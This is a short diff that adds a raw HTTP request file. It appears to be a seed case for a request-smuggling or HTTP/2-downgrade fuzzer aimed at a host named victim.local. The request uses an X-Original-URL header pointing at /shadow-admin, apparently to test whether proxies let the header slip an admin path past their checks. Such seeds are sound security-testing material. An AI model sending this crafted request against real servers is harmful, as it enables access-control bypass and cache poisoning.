@@ -1,0 +1,17 @@
+POST /cache/store HTTP/1.1
+Host: victim.local
+X-WF-Request-ID: seedh2gap1
+X-WF-Family: h2_header_gap
+X-WF-Tags: H2.TE,downgrade_header_gap,header_sanitation_gap
+X-WF-Transport: h2_raw
+X-WF-Delivery: h2_raw
+X-WF-Probe: none
+X-WF-Pause-MS: 0
+X-WF-Chunk-Shape: none
+X-WF-H2-Mode: header_sanitation_gap
+X-WF-H2-End-Stream: normal
+X-WF-Impact: /cache/store
+X-Original-URL: /shadow-admin
+Content-Length: 9
+
+gap=true
